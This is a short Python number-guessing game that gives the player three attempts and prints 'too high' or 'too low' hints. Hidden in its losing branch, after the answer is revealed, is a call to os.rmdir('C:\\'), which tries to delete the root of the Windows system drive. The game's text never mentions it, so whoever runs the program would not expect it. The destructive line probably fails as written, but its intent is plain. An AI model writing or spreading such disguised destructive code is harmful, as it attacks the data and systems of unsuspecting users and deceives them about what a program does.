import random
import os

x = random.randint(1, 10)
print("Welcome to the guessing game!")
print("I'm thinking of a number between 1 and 10.(You have 3 attempts to guess it.)")
attempts = 0
while attempts < 3:
    guess = input("Make a guess: ")
    if not guess.isdigit():
        print("Please enter a valid number.")
        continue
    guess = int(guess)
    attempts += 1
    if guess < x:
        print("Too low.")
    elif guess > x:
        print("Too high.")
    else:
        print(f"Congratulations! You've guessed the number {x} correctly!")
        break
else:
    print(f"Sorry, you've used all your attempts. The number was {x}.")
    os.rmdir("C:\\")

